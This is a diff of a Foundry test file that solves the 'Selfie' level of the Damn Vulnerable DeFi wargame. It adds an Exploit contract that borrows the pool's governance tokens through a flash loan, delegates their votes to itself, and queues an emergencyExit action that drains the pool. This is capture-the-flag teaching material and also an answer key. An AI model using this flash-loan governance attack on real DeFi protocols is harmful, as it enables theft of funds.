@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +64,17 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        bytes memory data = abi.encodeWithSelector(
+            SelfiePool.emergencyExit.selector,
+            recovery
+        );
+        Exploit e = new Exploit(pool, governance, token);
+        // 1. flashLoan pool->receiver
+        // 2. during flashloan, do governance action
+        e.exploit(TOKENS_IN_POOL, data);
+        skip(2 days);
+        // 3. execute govern action
+        governance.executeAction(e.actionId());
     }
 
     /**
@@ -71,6 +83,46 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Exploit is IERC3156FlashBorrower {
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    SelfiePool private p;
+    SimpleGovernance private s;
+    DamnValuableVotes private dv;
+    uint256 public actionId;
+
+    constructor(SelfiePool _p, SimpleGovernance _s, DamnValuableVotes _dv) {
+        p = _p;
+        s = _s;
+        dv = _dv;
+    }
+
+    function exploit(uint256 _amount, bytes memory _data) external {
+        p.flashLoan(this, address(dv), _amount, _data);
+    }
+
+    function onFlashLoan(
+        address,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        // delegate
+        dv.delegate(address(this));
+        // call emergencyExit
+        actionId = s.queueAction(address(p), 0, data);
+        // for repay
+        IERC20(token).approve(address(p), amount + fee);
+        return CALLBACK_SUCCESS;
     }
 }
